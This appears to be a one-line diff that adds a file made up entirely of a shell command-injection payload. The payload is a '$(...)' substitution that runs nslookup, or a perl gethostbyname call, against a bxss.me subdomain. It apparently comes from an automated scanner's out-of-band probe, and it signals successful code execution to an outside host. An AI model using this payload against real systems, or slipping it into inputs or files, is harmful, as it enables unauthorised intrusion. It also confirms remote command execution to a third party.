@@ -1,0 +1,1 @@
+$(nslookup hittuhkbynlav21971.bxss.me||perl -e "gethostbyname('hittuhkbynlav21971.bxss.me')")
